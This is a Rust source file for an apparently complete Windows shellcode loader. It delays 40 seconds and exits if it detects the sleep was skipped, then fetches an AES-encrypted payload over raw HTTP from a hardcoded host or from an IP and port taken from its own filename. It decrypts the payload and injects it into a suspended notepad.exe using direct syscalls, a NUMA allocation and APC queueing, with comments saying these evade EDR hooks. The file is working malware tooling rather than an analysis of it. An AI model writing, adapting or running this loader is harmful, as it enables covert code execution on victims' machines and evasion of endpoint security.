mod syscalls;

use aes::{
    Aes256,
    cipher::{BlockModeDecrypt, BlockModeEncrypt, KeyIvInit, block_padding::Pkcs7},
};
use cbc::{Decryptor, Encryptor};
use std::{
    error::Error, io::{Read, Write}, net::TcpStream, thread, time::{Duration, SystemTime},
};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

const KEY_HEX: &str = "359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b401660e4a";
const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";

const REMOTE_IP: &str = "10.10.14.16";
const REMOTE_PORT: &str = "80";

const FILE_PATH: &str = "s";
const INJECTION_PROCESS: &str = "C:\\windows\\system32\\notepad.exe";

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // Encrypt file if --encrypt argument is provided
    if let Some(pos) = args.iter().position(|a| a == "--encrypt") {
        if let Some(filepath) = args.get(pos + 1) {
            let key = decode_hex::<32>(KEY_HEX);
            let plaintext = std::fs::read(filepath).expect("Failed to read file");
            let encrypted = encrypt_data(&key, &plaintext);
            let dir = std::path::Path::new(filepath).parent().unwrap_or(std::path::Path::new("."));
            std::fs::write(dir.join("s"), encrypted).expect("Failed to write encrypted file");
            return;
        }
    }

    // Override IP/port from binary filename if format is strongside_<ip>_<port>[.exe]
    let exe_path = std::env::current_exe().unwrap_or_default();
    let exe_stem = exe_path.file_stem().and_then(|s| s.to_str()).unwrap_or("");
    let (remote_ip, remote_port) = if let Some(rest) = exe_stem.strip_prefix("strongside_") {
        if let Some(sep) = rest.rfind('_') {
            let ip = &rest[..sep];
            let port = &rest[sep + 1..];
            if !ip.is_empty() && !port.is_empty() {
                (ip.to_string(), port.to_string())
            } else {
                (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
            }
        } else {
            (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
        }
    } else {
        (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
    };

    wait(Duration::from_secs(40));
    let key = decode_hex::<32>(KEY_HEX);
    let encrypted_data = download_file(&remote_ip, &remote_port, FILE_PATH).unwrap();
    let data = decrypt_data(&key, encrypted_data);
    inject_and_execute(data);
}

fn wait(duration: Duration) {
    let start_time = SystemTime::now();
    thread::sleep(duration);
    let end_time = SystemTime::now();

    let elapsed = end_time.duration_since(start_time).unwrap_or(Duration::from_secs(0));
    if elapsed.as_secs_f64() <= duration.as_secs_f64() - 0.5f64 {
        std::process::exit(0);
    }
}

fn download_file(remote_ip: &str, remote_port: &str, path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut stream = TcpStream::connect(format!("{}:{}", remote_ip, remote_port))?;
    
    let request = format!("GET /{} HTTP/1.1\r\n\r\n", path);
    stream.write_all(request.as_bytes())?;
    
    let mut data = Vec::new();
    let mut buffer = [0; 512];
    
    loop {
        let num_bytes = stream.read(&mut buffer)?;
        if num_bytes == 0 {
            break; // Connection closed
        }
        data.extend_from_slice(&buffer[..num_bytes]);
    }
    
    Ok(data)
}

fn decode_hex<const N: usize>(hex: &str) -> [u8; N] {
    let mut bytes = [0u8; N];
    for (i, byte) in bytes.iter_mut().enumerate() {
        *byte = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).unwrap();
    }
    bytes
}

fn encrypt_data(key: &[u8; 32], plaintext: &[u8]) -> Vec<u8> {
    let iv = decode_hex::<16>(IV_HEX);
    let mut buf = vec![0u8; plaintext.len() + 16];
    buf[..plaintext.len()].copy_from_slice(plaintext);
    let ct_len = Aes256CbcEnc::new(key.into(), &iv.into())
        .encrypt_padded::<Pkcs7>(&mut buf, plaintext.len())
        .unwrap()
        .len();
    buf.truncate(ct_len);
    buf
}

fn decrypt_data(key: &[u8; 32], data: Vec<u8>) -> Vec<u8> {
    let iv = decode_hex::<16>(IV_HEX);
    let mut buf = data;
    Aes256CbcDec::new(key.into(), &iv.into())
        .decrypt_padded::<Pkcs7>(&mut buf)
        .unwrap()
        .to_vec()
}

fn inject_and_execute(data: Vec<u8>) {
    unsafe {
        // Size the attribute list buffer for one attribute, then allocate and initialise it.
        let mut attribute_size: usize = 0;
        syscalls::InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attribute_size);
        let attr_buffer = syscalls::HeapAlloc(syscalls::GetProcessHeap(), syscalls::HEAP_ZERO_MEMORY, attribute_size);
        syscalls::InitializeProcThreadAttributeList(attr_buffer, 1, 0, &mut attribute_size);

        // Block non-Microsoft DLL injection into the spawned process.
        let mut policy = syscalls::MITIGATION_BLOCK_NON_MICROSOFT;
        syscalls::UpdateProcThreadAttribute(
            attr_buffer,
            0,
            syscalls::PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            &mut policy as *mut u64 as *mut _,
            std::mem::size_of::<u64>(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        let mut startup_info_ex: syscalls::STARTUPINFOEXA = std::mem::zeroed();
        startup_info_ex.startup_info.cb = std::mem::size_of::<syscalls::STARTUPINFOEXA>() as u32;
        startup_info_ex.lp_attribute_list = attr_buffer;

        let mut process_information: syscalls::PROCESS_INFORMATION = std::mem::zeroed();

        syscalls::CreateProcessA(
            INJECTION_PROCESS.as_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            syscalls::EXTENDED_STARTUPINFO_PRESENT | syscalls::CREATE_SUSPENDED | syscalls::CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut startup_info_ex.startup_info,
            &mut process_information,
        );

        syscalls::HeapFree(syscalls::GetProcessHeap(), 0, attr_buffer);

        // Allocate RW memory in the remote process.  NUMA node 0 keeps the allocation
        // off the default VirtualAllocEx code path watched by some EDR heuristics.
        let allocation_start = syscalls::VirtualAllocExNuma(
            process_information.h_process,
            std::ptr::null_mut(),
            data.len(),
            syscalls::MEM_COMMIT | syscalls::MEM_RESERVE,
            syscalls::PAGE_READWRITE,
            0,
        );

        // Write shellcode via direct syscall (bypasses hooks on NtWriteVirtualMemory).
        syscalls::Sw3NtWriteVirtualMemory(
            process_information.h_process,
            allocation_start,
            data.as_ptr() as *const _,
            data.len(),
            std::ptr::null_mut(),
        );

        // Flip protection to RX via direct syscall (bypasses hooks on NtProtectVirtualMemory).
        let mut base = allocation_start;
        let mut region_size = data.len();
        let mut old_protect: u32 = 0;
        syscalls::Sw3NtProtectVirtualMemory(
            process_information.h_process,
            &mut base,
            &mut region_size,
            syscalls::PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        // Queue shellcode as an APC on the suspended main thread; it fires on ResumeThread.
        syscalls::QueueUserAPC(allocation_start, process_information.h_thread, 0);
        syscalls::ResumeThread(process_information.h_thread);
    }
}